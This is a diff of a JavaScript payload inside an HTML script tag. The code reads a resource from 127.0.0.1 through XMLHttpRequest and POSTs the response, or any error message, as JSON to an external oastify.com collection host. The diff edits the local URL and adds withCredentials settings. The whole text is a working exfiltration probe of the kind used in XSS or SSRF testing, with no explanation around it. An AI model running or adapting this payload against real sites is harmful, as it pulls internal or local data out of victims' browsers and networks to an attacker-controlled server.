@@ -1,19 +1,23 @@
 
         <script>
 
+
 // Function to make the XHR request
 function sendRequest() {
     // Create a new XMLHttpRequest object
     var xhr = new XMLHttpRequest();
     
     // Define the URL for the local server
-    var localUrl = 'http://127.0.0.1:8000';
+    var localUrl = 'https://127.0.0.1/index.js';
     
     // Define the URL for the external server
     var externalUrl = 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com';
 
     // Configure it: GET-request for the URL
     xhr.open('GET', localUrl, true);
+
+    // Disable sending credentials with the request
+    xhr.withCredentials = false;
 
     // Define what happens on successful data submission
     xhr.onload = function () {
@@ -42,6 +46,10 @@ function sendToExternalServer(data) {
 
     // Configure it: POST-request for the URL
     xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);
+
+    // Disable sending credentials with the request
+    xhr.withCredentials = false;
+
     xhr.setRequestHeader('Content-Type', 'application/json');
 
     // Define what happens on successful data submission
@@ -70,6 +78,10 @@ function sendPingWithError(errorMessage) {
 
     // Configure it: POST-request for the URL
     xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);
+
+    // Disable sending credentials with the request
+    xhr.withCredentials = false;
+
     xhr.setRequestHeader('Content-Type', 'application/json');
 
     // Define what happens on successful data submission
@@ -92,5 +104,6 @@ function sendPingWithError(errorMessage) {
 
 // Call the function to initiate the requests
 sendRequest();
+
 
 </script>
